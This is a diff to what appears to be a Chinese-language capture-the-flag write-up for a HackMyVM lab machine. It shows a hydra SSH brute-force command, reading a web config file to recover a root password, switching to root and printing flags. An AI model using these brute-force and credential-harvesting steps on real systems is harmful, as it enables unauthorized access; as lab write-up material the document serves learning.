@@ -80,3 +80,13 @@ hydra -L user_20240416.txt -P pass_20240416.txt -t 16 ssh://192.168.44.133
 cat user.txt
 HMV{717f274ee66f8541a3031f175f615e72}
 ```
+
+# 提权
+```C
+ls /var/www/html
+cat /var/www/html/customer/config.php
+'root', 'fastandquicktobefaster'
+su root
+
+HMV{f178761104e933f9341f13f64b38538a}
+```
